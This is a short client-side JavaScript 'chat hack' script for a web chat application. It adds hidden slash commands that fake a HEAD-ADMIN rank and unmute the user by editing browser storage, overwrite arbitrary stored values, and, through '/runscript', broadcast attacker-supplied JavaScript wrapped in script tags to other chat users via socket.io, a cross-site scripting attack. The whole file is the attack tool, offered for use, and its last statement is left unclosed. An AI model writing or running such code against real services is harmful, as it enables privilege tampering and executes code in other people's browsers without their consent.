$('.chat').append("<br><p>GMS Chat Hax Enabled</p><br>");
$('form').submit(function(e) {
    var message = $(e.target).find('input').val();
    if (message === "/easyadmin") {
        localStorage.setItem('myrank', 'HEAD-ADMIN');
    }
    if (message === "/easyunmute") {
        localStorage.setItem('mute', 0);
    }
    if (message === "/runscript") {
        var scriptToRun = prompt("Run script on server:");
        io().emit('message', {
            username: '',
            message: '<script>' + scriptToRun + '</script>',
            myrank: '',
            verified: ''
        });
    }
    if (message === "/editval") {
        var valToEdit = prompt("Value to edit:");
        var toEditTo = prompt("Edeit value to:");
        localStorage.setItem(valToEdit, toEditTo);
    }
}
